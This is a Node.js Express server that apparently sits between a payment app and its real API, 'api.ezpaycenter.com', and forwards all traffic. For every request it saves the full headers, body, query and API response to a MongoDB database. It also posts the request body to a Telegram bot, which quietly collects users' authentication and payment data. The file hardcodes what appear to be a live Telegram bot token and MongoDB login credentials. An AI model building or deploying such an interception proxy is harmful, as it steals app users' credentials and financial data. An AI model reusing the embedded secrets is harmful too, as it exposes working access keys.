const express = require("express")
const mongoose = require("mongoose")
const cors = require("cors")
const fetch = require("node-fetch")

const app = express()

app.use(cors())
app.use(express.json({ limit: "50mb" }))
app.use(express.urlencoded({ extended: true }))

// Original API
const TARGET_API = "https://api.ezpaycenter.com"

// Telegram details
const BOT_TOKEN = "8432120836:AAGY6HSYRnT1EtU0SyEA_8G0IaeqXn3gido"
const CHAT_ID = "8576159487"

// MongoDB connect
mongoose.connect("mongodb+srv://Yourgaurav07:dtGsryvfx3cpBOad@ezpay.le2xuq1.mongodb.net/ezpay?retryWrites=true&w=majority")
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log(err))

// Schema
const LogSchema = new mongoose.Schema({
headers: Object,
body: Object,
query: Object,
response: String,
path: String,
time: { type: Date, default: Date.now }
})

const Log = mongoose.model("Log", LogSchema)

// Telegram function
async function sendTelegram(message) {

try{

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({
chat_id: CHAT_ID,
text: message
})
})

}catch(e){
console.log("Telegram error")
}

}

// Proxy API
app.all("*", async (req, res) => {

try {

const url = TARGET_API + req.originalUrl

// headers clean
const headers = {
"Content-Type": "application/json",
"User-Agent": "Mozilla/5.0"
}

const options = {
method: req.method,
headers: headers
}

// body only for POST/PUT
if (req.method !== "GET") {
options.body = JSON.stringify(req.body)
}

// forward request
const apiResponse = await fetch(url, options)

const data = await apiResponse.text()

// Save log in MongoDB
const log = new Log({
headers: req.headers,
body: req.body,
query: req.query,
response: data,
path: req.originalUrl
})

await log.save()

// Telegram alert
sendTelegram(
`New API Request

Path: ${req.originalUrl}
Method: ${req.method}
Time: ${new Date().toLocaleString()}
Body: ${JSON.stringify(req.body)}`
)

// Send response back to app
res.status(apiResponse.status).send(data)

} catch (err) {

console.log(err)
res.status(500).send("Proxy Error")

}

})

// server start
const PORT = process.env.PORT || 5000

app.listen(PORT, () => {
console.log("Server Running")
})
